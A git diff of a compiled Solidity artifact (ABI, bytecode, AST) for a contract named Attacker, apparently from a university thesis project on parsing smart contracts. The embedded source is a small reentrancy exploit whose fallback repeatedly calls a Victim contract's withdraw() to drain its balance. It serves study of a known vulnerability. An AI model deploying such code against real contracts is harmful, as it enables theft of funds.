@@ -62,15 +62,15 @@
       "type": "function"
     }
   ],
-  "metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"victim\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"c\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"LogFallback\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"count\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Attacker.sol\":{\"keccak256\":\"0xa87a181bbeacfacbfd3a65a8c07a3ca8add77ebd79adf06540f26d18a4a35f59\",\"urls\":[\"bzz-raw://4b34cf67fa31ba68e45f40a80bbaaa60bf13642d13425576d7a1e2cd8b83fa0a\",\"dweb:/ipfs/QmWwTHRRLUAqCwmfPh2awsiXMDS7wufhvsQgoHCJE3R8P5\"]},\"/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Victim.sol\":{\"keccak256\":\"0xa37ff254c7c9fd9be21962cf95a650eb8742c93260a5038ece0ae941be7b23ef\",\"urls\":[\"bzz-raw://2075e46019185752d066578f5a2b7e1168e77c74e9d0735a72be8ab1b54b3b54\",\"dweb:/ipfs/QmUpiNAeYFkwRJM2UkmzE9fi3pE6HFLVGsuGP5Vhe9ud6T\"]}},\"version\":1}",
-  "bytecode": "0x608060405234801561001057600080fd5b506040516102c23803806102c28339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061022e806100946000396000f3fe6080604052600436106100295760003560e01c806306661abd1461012e5780639e5faafc14610159575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311461012c576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050505b005b34801561013a57600080fd5b50610143610170565b6040518082815260200191505060405180910390f35b34801561016557600080fd5b5061016e610176565b005b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b5050505056fea265627a7a72315820b5e42d107adbd0d4dcb8defd84a5e8e6955cc1a4ec41119c3041678363fc260164736f6c63430005100032",
-  "deployedBytecode": "0x6080604052600436106100295760003560e01c806306661abd1461012e5780639e5faafc14610159575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311461012c576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050505b005b34801561013a57600080fd5b50610143610170565b6040518082815260200191505060405180910390f35b34801561016557600080fd5b5061016e610176565b005b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b5050505056fea265627a7a72315820b5e42d107adbd0d4dcb8defd84a5e8e6955cc1a4ec41119c3041678363fc260164736f6c63430005100032",
+  "metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"victim\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"c\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"LogFallback\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"count\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Attacker.sol\":{\"keccak256\":\"0xa87a181bbeacfacbfd3a65a8c07a3ca8add77ebd79adf06540f26d18a4a35f59\",\"urls\":[\"bzz-raw://4b34cf67fa31ba68e45f40a80bbaaa60bf13642d13425576d7a1e2cd8b83fa0a\",\"dweb:/ipfs/QmWwTHRRLUAqCwmfPh2awsiXMDS7wufhvsQgoHCJE3R8P5\"]},\"/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Victim.sol\":{\"keccak256\":\"0x753548b276887adfae136e08f1794d3c492d38ecd51fb44ae3e6948e02a9bdaf\",\"urls\":[\"bzz-raw://7313cac0bdd1d9dee8ef72b400951a8f68ae3b87743bb8a92ba7ddc4c1d836c1\",\"dweb:/ipfs/QmPStyVTCzcKamp1EvVMR4YMZ6keRZ52wmpMBXa6N7pSVw\"]}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b506040516102c23803806102c28339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061022e806100946000396000f3fe6080604052600436106100295760003560e01c806306661abd1461012e5780639e5faafc14610159575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311461012c576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050505b005b34801561013a57600080fd5b50610143610170565b6040518082815260200191505060405180910390f35b34801561016557600080fd5b5061016e610176565b005b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b5050505056fea265627a7a72315820a3a0c1ef8607cd6cf7734731bd9965589c2d2208cc922167c13684b904819e1864736f6c63430005100032",
+  "deployedBytecode": "0x6080604052600436106100295760003560e01c806306661abd1461012e5780639e5faafc14610159575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311461012c576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050505b005b34801561013a57600080fd5b50610143610170565b6040518082815260200191505060405180910390f35b34801561016557600080fd5b5061016e610176565b005b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b5050505056fea265627a7a72315820a3a0c1ef8607cd6cf7734731bd9965589c2d2208cc922167c13684b904819e1864736f6c63430005100032",
   "sourceMap": "84:625:0:-;;;276:72;8:9:-1;5:2;;;30:1;27;20:12;5:2;276:72:0;;;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;276:72:0;;;;;;;;;;;;;;;;333:6;322:1;;:18;;;;;;;;;;;;;;;;;;276:72;84:625;;;;;;",
   "deployedSourceMap": "84:625:0:-;;;;;;;;;;;;;;;;;;;;;;;530:41;542:5;;549:21;530:41;;;;;;;;;;;;;;;;;;;;;;;;657:1;643;;;;;;;;;;;635:18;;;:23;631:68;;675:1;;;;;;;;;;;:10;;;:12;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;675:12:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;675:12:0;;;;631:68;84:625;124:17;;8:9:-1;5:2;;;30:1;27;20:12;5:2;124:17:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;356:55;;8:9:-1;5:2;;;30:1;27;20:12;5:2;356:55:0;;;:::i;:::-;;124:17;;;;:::o;356:55::-;391:1;;;;;;;;;;;:10;;;:12;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;391:12:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;391:12:0;;;;356:55::o",
   "source": "pragma solidity >= 0.5.8;\r\n\r\n//import Victim's source code\r\nimport './Victim.sol';\r\ncontract Attacker {\r\n    Victim v;\r\n    uint public count;\r\n    event LogFallback(uint c, uint balance);\r\n \r\n    //Create the contract object \r\n    //by setting the address of the Victim\r\n    constructor(address victim) public {\r\n        v = Victim(victim);\r\n    }\r\n\r\n    function attack() public{\r\n        v.withdraw();\r\n    }\r\n\r\n    //Fallback defined with external\r\n    function () external payable {\r\n        //emit repetition \r\n        emit LogFallback(count, address(this).balance);\r\n\r\n        //Keep withdrawing till it's all gone\r\n        if (address(v).balance != 0) {\r\n            v.withdraw();\r\n        }\r\n    }\r\n}",
-  "sourcePath": "C:/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Attacker.sol",
+  "sourcePath": "C:/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Attacker.sol",
   "ast": {
-    "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Attacker.sol",
+    "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Attacker.sol",
     "exportedSymbols": {
       "Attacker": [
         59
@@ -91,12 +91,12 @@
         "src": "0:25:0"
       },
       {
-        "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Victim.sol",
+        "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Victim.sol",
         "file": "./Victim.sol",
         "id": 2,
         "nodeType": "ImportDirective",
         "scope": 60,
-        "sourceUnit": 823,
+        "sourceUnit": 1213,
         "src": "60:22:0",
         "symbolAliases": [],
         "unitAlias": ""
@@ -124,7 +124,7 @@
             "stateVariable": true,
             "storageLocation": "default",
             "typeDescriptions": {
-              "typeIdentifier": "t_contract$_Victim_$822",
+              "typeIdentifier": "t_contract$_Victim_$1212",
               "typeString": "contract Victim"
             },
             "typeName": {
@@ -132,10 +132,10 @@
               "id": 3,
               "name": "Victim",
               "nodeType": "UserDefinedTypeName",
-              "referencedDeclaration": 822,
+              "referencedDeclaration": 1212,
               "src": "109:6:0",
               "typeDescriptions": {
-                "typeIdentifier": "t_contract$_Victim_$822",
+                "typeIdentifier": "t_contract$_Victim_$1212",
                 "typeString": "contract Victim"
               }
             },
@@ -260,7 +260,7 @@
                       "referencedDeclaration": 4,
                       "src": "322:1:0",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Victim_$822",
+                        "typeIdentifier": "t_contract$_Victim_$1212",
                         "typeString": "contract Victim"
                       }
                     },
@@ -294,10 +294,10 @@
                         "name": "Victim",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 822,
+                        "referencedDeclaration": 1212,
                         "src": "326:6:0",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_type$_t_contract$_Victim_$822_$",
+                          "typeIdentifier": "t_type$_t_contract$_Victim_$1212_$",
                           "typeString": "type(contract Victim)"
                         }
                       },
@@ -311,13 +311,13 @@
                       "nodeType": "FunctionCall",
                       "src": "326:14:0",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Victim_$822",
+                        "typeIdentifier": "t_contract$_Victim_$1212",
                         "typeString": "contract Victim"
                       }
                     },
                     "src": "322:18:0",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_Victim_$822",
+                      "typeIdentifier": "t_contract$_Victim_$1212",
                       "typeString": "contract Victim"
                     }
                   },
@@ -401,7 +401,7 @@
                         "referencedDeclaration": 4,
                         "src": "391:1:0",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Victim_$822",
+                          "typeIdentifier": "t_contract$_Victim_$1212",
                           "typeString": "contract Victim"
                         }
                       },
@@ -412,7 +412,7 @@
                       "lValueRequested": false,
                       "memberName": "withdraw",
                       "nodeType": "MemberAccess",
-                      "referencedDeclaration": 458,
+                      "referencedDeclaration": 784,
                       "src": "391:10:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
@@ -498,7 +498,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 853,
+                              "referencedDeclaration": 1243,
                               "src": "557:4:0",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_Attacker_$59",
@@ -621,7 +621,7 @@
                             "referencedDeclaration": 4,
                             "src": "643:1:0",
                             "typeDescriptions": {
-                              "typeIdentifier": "t_contract$_Victim_$822",
+                              "typeIdentifier": "t_contract$_Victim_$1212",
                               "typeString": "contract Victim"
                             }
                           }
@@ -629,7 +629,7 @@
                         "expression": {
                           "argumentTypes": [
                             {
-                              "typeIdentifier": "t_contract$_Victim_$822",
+                              "typeIdentifier": "t_contract$_Victim_$1212",
                               "typeString": "contract Victim"
                             }
                           ],
@@ -724,7 +724,7 @@
                               "referencedDeclaration": 4,
                               "src": "675:1:0",
                               "typeDescriptions": {
-                                "typeIdentifier": "t_contract$_Victim_$822",
+                                "typeIdentifier": "t_contract$_Victim_$1212",
                                 "typeString": "contract Victim"
                               }
                             },
@@ -735,7 +735,7 @@
                             "lValueRequested": false,
                             "memberName": "withdraw",
                             "nodeType": "MemberAccess",
-                            "referencedDeclaration": 458,
+                            "referencedDeclaration": 784,
                             "src": "675:10:0",
                             "typeDescriptions": {
                               "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
@@ -798,731 +798,843 @@
     "src": "0:709:0"
   },
   "legacyAST": {
-    "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Attacker.sol",
-    "exportedSymbols": {
-      "Attacker": [
-        59
-      ]
+    "attributes": {
+      "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Attacker.sol",
+      "exportedSymbols": {
+        "Attacker": [
+          59
+        ]
+      }
     },
-    "id": 60,
-    "nodeType": "SourceUnit",
-    "nodes": [
+    "children": [
       {
+        "attributes": {
+          "literals": [
+            "solidity",
+            ">=",
+            "0.5",
+            ".8"
+          ]
+        },
         "id": 1,
-        "literals": [
-          "solidity",
-          ">=",
-          "0.5",
-          ".8"
-        ],
-        "nodeType": "PragmaDirective",
+        "name": "PragmaDirective",
         "src": "0:25:0"
       },
       {
-        "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/After Confirmation/code-parser-web/contracts/Victim.sol",
-        "file": "./Victim.sol",
+        "attributes": {
+          "SourceUnit": 1213,
+          "absolutePath": "/C/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Victim.sol",
+          "file": "./Victim.sol",
+          "scope": 60,
+          "symbolAliases": [
+            null
+          ],
+          "unitAlias": ""
+        },
         "id": 2,
-        "nodeType": "ImportDirective",
-        "scope": 60,
-        "sourceUnit": 823,
-        "src": "60:22:0",
-        "symbolAliases": [],
-        "unitAlias": ""
+        "name": "ImportDirective",
+        "src": "60:22:0"
       },
       {
-        "baseContracts": [],
-        "contractDependencies": [],
-        "contractKind": "contract",
-        "documentation": null,
-        "fullyImplemented": true,
-        "id": 59,
-        "linearizedBaseContracts": [
-          59
-        ],
-        "name": "Attacker",
-        "nodeType": "ContractDefinition",
-        "nodes": [
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            null
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": true,
+          "linearizedBaseContracts": [
+            59
+          ],
+          "name": "Attacker",
+          "scope": 60
+        },
+        "children": [
           {
-            "constant": false,
-            "id": 4,
-            "name": "v",
-            "nodeType": "VariableDeclaration",
-            "scope": 59,
-            "src": "109:8:0",
-            "stateVariable": true,
-            "storageLocation": "default",
-            "typeDescriptions": {
-              "typeIdentifier": "t_contract$_Victim_$822",
-              "typeString": "contract Victim"
+            "attributes": {
+              "constant": false,
+              "name": "v",
+              "scope": 59,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "contract Victim",
+              "value": null,
+              "visibility": "internal"
             },
-            "typeName": {
-              "contractScope": null,
-              "id": 3,
-              "name": "Victim",
-              "nodeType": "UserDefinedTypeName",
-              "referencedDeclaration": 822,
-              "src": "109:6:0",
-              "typeDescriptions": {
-                "typeIdentifier": "t_contract$_Victim_$822",
-                "typeString": "contract Victim"
-              }
-            },
-            "value": null,
-            "visibility": "internal"
-          },
-          {
-            "constant": false,
-            "id": 6,
-            "name": "count",
-            "nodeType": "VariableDeclaration",
-            "scope": 59,
-            "src": "124:17:0",
-            "stateVariable": true,
-            "storageLocation": "default",
-            "typeDescriptions": {
-              "typeIdentifier": "t_uint256",
-              "typeString": "uint256"
-            },
-            "typeName": {
-              "id": 5,
-              "name": "uint",
-              "nodeType": "ElementaryTypeName",
-              "src": "124:4:0",
-              "typeDescriptions": {
-                "typeIdentifier": "t_uint256",
-                "typeString": "uint256"
-              }
-            },
-            "value": null,
-            "visibility": "public"
-          },
-          {
-            "anonymous": false,
-            "documentation": null,
-            "id": 12,
-            "name": "LogFallback",
-            "nodeType": "EventDefinition",
-            "parameters": {
-              "id": 11,
-              "nodeType": "ParameterList",
-              "parameters": [
-                {
-                  "constant": false,
-                  "id": 8,
-                  "indexed": false,
-                  "name": "c",
-                  "nodeType": "VariableDeclaration",
-                  "scope": 12,
-                  "src": "166:6:0",
-                  "stateVariable": false,
-                  "storageLocation": "default",
-                  "typeDescriptions": {
-                    "typeIdentifier": "t_uint256",
-                    "typeString": "uint256"
-                  },
-                  "typeName": {
-                    "id": 7,
-                    "name": "uint",
-                    "nodeType": "ElementaryTypeName",
-                    "src": "166:4:0",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_uint256",
-                      "typeString": "uint256"
-                    }
-                  },
-                  "value": null,
-                  "visibility": "internal"
+            "children": [
+              {
+                "attributes": {
+                  "contractScope": null,
+                  "name": "Victim",
+                  "referencedDeclaration": 1212,
+                  "type": "contract Victim"
                 },
-                {
-                  "constant": false,
-                  "id": 10,
-                  "indexed": false,
-                  "name": "balance",
-                  "nodeType": "VariableDeclaration",
-                  "scope": 12,
-                  "src": "174:12:0",
-                  "stateVariable": false,
-                  "storageLocation": "default",
-                  "typeDescriptions": {
-                    "typeIdentifier": "t_uint256",
-                    "typeString": "uint256"
-                  },
-                  "typeName": {
-                    "id": 9,
-                    "name": "uint",
-                    "nodeType": "ElementaryTypeName",
-                    "src": "174:4:0",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_uint256",
-                      "typeString": "uint256"
-                    }
-                  },
-                  "value": null,
-                  "visibility": "internal"
-                }
-              ],
-              "src": "165:22:0"
+                "id": 3,
+                "name": "UserDefinedTypeName",
+                "src": "109:6:0"
+              }
+            ],
+            "id": 4,
+            "name": "VariableDeclaration",
+            "src": "109:8:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "count",
+              "scope": 59,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "uint256",
+              "value": null,
+              "visibility": "public"
             },
+            "children": [
+              {
+                "attributes": {
+                  "name": "uint",
+                  "type": "uint256"
+                },
+                "id": 5,
+                "name": "ElementaryTypeName",
+                "src": "124:4:0"
+              }
+            ],
+            "id": 6,
+            "name": "VariableDeclaration",
+            "src": "124:17:0"
+          },
+          {
+            "attributes": {
+              "anonymous": false,
+              "documentation": null,
+              "name": "LogFallback"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "indexed": false,
+                      "name": "c",
+                      "scope": 12,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "uint256",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "uint",
+                          "type": "uint256"
+                        },
+                        "id": 7,
+                        "name": "ElementaryTypeName",
+                        "src": "166:4:0"
+                      }
+                    ],
+                    "id": 8,
+                    "name": "VariableDeclaration",
+                    "src": "166:6:0"
+                  },
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "indexed": false,
+                      "name": "balance",
+                      "scope": 12,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "uint256",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "uint",
+                          "type": "uint256"
+                        },
+                        "id": 9,
+                        "name": "ElementaryTypeName",
+                        "src": "174:4:0"
+                      }
+                    ],
+                    "id": 10,
+                    "name": "VariableDeclaration",
+                    "src": "174:12:0"
+                  }
+                ],
+                "id": 11,
+                "name": "ParameterList",
+                "src": "165:22:0"
+              }
+            ],
+            "id": 12,
+            "name": "EventDefinition",
             "src": "148:40:0"
           },
           {
-            "body": {
-              "id": 23,
-              "nodeType": "Block",
-              "src": "311:37:0",
-              "statements": [
-                {
-                  "expression": {
-                    "argumentTypes": null,
-                    "id": 21,
-                    "isConstant": false,
-                    "isLValue": false,
-                    "isPure": false,
-                    "lValueRequested": false,
-                    "leftHandSide": {
-                      "argumentTypes": null,
-                      "id": 17,
-                      "name": "v",
-                      "nodeType": "Identifier",
-                      "overloadedDeclarations": [],
-                      "referencedDeclaration": 4,
-                      "src": "322:1:0",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Victim_$822",
-                        "typeString": "contract Victim"
-                      }
-                    },
-                    "nodeType": "Assignment",
-                    "operator": "=",
-                    "rightHandSide": {
-                      "argumentTypes": null,
-                      "arguments": [
-                        {
-                          "argumentTypes": null,
-                          "id": 19,
-                          "name": "victim",
-                          "nodeType": "Identifier",
-                          "overloadedDeclarations": [],
-                          "referencedDeclaration": 14,
-                          "src": "333:6:0",
-                          "typeDescriptions": {
-                            "typeIdentifier": "t_address",
-                            "typeString": "address"
-                          }
-                        }
-                      ],
-                      "expression": {
-                        "argumentTypes": [
-                          {
-                            "typeIdentifier": "t_address",
-                            "typeString": "address"
-                          }
-                        ],
-                        "id": 18,
-                        "name": "Victim",
-                        "nodeType": "Identifier",
-                        "overloadedDeclarations": [],
-                        "referencedDeclaration": 822,
-                        "src": "326:6:0",
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_type$_t_contract$_Victim_$822_$",
-                          "typeString": "type(contract Victim)"
-                        }
-                      },
-                      "id": 20,
-                      "isConstant": false,
-                      "isLValue": false,
-                      "isPure": false,
-                      "kind": "typeConversion",
-                      "lValueRequested": false,
-                      "names": [],
-                      "nodeType": "FunctionCall",
-                      "src": "326:14:0",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_Victim_$822",
-                        "typeString": "contract Victim"
-                      }
-                    },
-                    "src": "322:18:0",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_Victim_$822",
-                      "typeString": "contract Victim"
-                    }
-                  },
-                  "id": 22,
-                  "nodeType": "ExpressionStatement",
-                  "src": "322:18:0"
-                }
-              ]
-            },
-            "documentation": null,
-            "id": 24,
-            "implemented": true,
-            "kind": "constructor",
-            "modifiers": [],
-            "name": "",
-            "nodeType": "FunctionDefinition",
-            "parameters": {
-              "id": 15,
-              "nodeType": "ParameterList",
-              "parameters": [
-                {
-                  "constant": false,
-                  "id": 14,
-                  "name": "victim",
-                  "nodeType": "VariableDeclaration",
-                  "scope": 24,
-                  "src": "288:14:0",
-                  "stateVariable": false,
-                  "storageLocation": "default",
-                  "typeDescriptions": {
-                    "typeIdentifier": "t_address",
-                    "typeString": "address"
-                  },
-                  "typeName": {
-                    "id": 13,
-                    "name": "address",
-                    "nodeType": "ElementaryTypeName",
-                    "src": "288:7:0",
-                    "stateMutability": "nonpayable",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_address",
-                      "typeString": "address"
-                    }
-                  },
-                  "value": null,
-                  "visibility": "internal"
-                }
+            "attributes": {
+              "documentation": null,
+              "implemented": true,
+              "isConstructor": true,
+              "kind": "constructor",
+              "modifiers": [
+                null
               ],
-              "src": "287:16:0"
+              "name": "",
+              "scope": 59,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
             },
-            "returnParameters": {
-              "id": 16,
-              "nodeType": "ParameterList",
-              "parameters": [],
-              "src": "311:0:0"
-            },
-            "scope": 59,
-            "src": "276:72:0",
-            "stateMutability": "nonpayable",
-            "superFunction": null,
-            "visibility": "public"
-          },
-          {
-            "body": {
-              "id": 32,
-              "nodeType": "Block",
-              "src": "380:31:0",
-              "statements": [
-                {
-                  "expression": {
-                    "argumentTypes": null,
-                    "arguments": [],
-                    "expression": {
-                      "argumentTypes": [],
-                      "expression": {
-                        "argumentTypes": null,
-                        "id": 27,
-                        "name": "v",
-                        "nodeType": "Identifier",
-                        "overloadedDeclarations": [],
-                        "referencedDeclaration": 4,
-                        "src": "391:1:0",
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_contract$_Victim_$822",
-                          "typeString": "contract Victim"
-                        }
-                      },
-                      "id": 29,
-                      "isConstant": false,
-                      "isLValue": false,
-                      "isPure": false,
-                      "lValueRequested": false,
-                      "memberName": "withdraw",
-                      "nodeType": "MemberAccess",
-                      "referencedDeclaration": 458,
-                      "src": "391:10:0",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
-                        "typeString": "function () external"
-                      }
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "victim",
+                      "scope": 24,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
                     },
-                    "id": 30,
-                    "isConstant": false,
-                    "isLValue": false,
-                    "isPure": false,
-                    "kind": "functionCall",
-                    "lValueRequested": false,
-                    "names": [],
-                    "nodeType": "FunctionCall",
-                    "src": "391:12:0",
-                    "typeDescriptions": {
